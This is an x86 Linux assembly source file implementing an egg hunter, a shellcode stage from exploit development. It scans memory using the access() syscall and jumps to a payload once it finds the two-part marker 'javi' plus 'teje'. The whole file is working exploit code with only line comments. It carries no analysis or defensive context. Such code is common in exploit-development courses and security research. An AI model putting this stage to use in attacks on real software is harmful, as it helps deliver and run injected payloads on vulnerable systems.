;egg hunter using access() syscall
;author: Javier Tejedor
;date: 09/09/2011

global  _start

section .text

_start:
	pop ebx			;load an address

_search_pages:
	inc ebx			;increments this address
	push 0x21		;access() syscall to check if we have access to this address or not
	pop eax
	int 0x80
	cmp al, 0xf2		;access() will return 0xf2 if the address is not valid
	jz _search_pages	;continue searching

_check_egg:
        cmp dword[ebx-8], egg 	;checks the first part of the egg
        jne _search_pages
        cmp dword[ebx-4], egg1  ;checks the second part of the egg.
        jne _search_pages
        jmp ebx			;if it has found the egg, jumps to it.

section .data
	egg equ "javi"		;first part of egg
	egg1 equ "teje"		;second part of egg
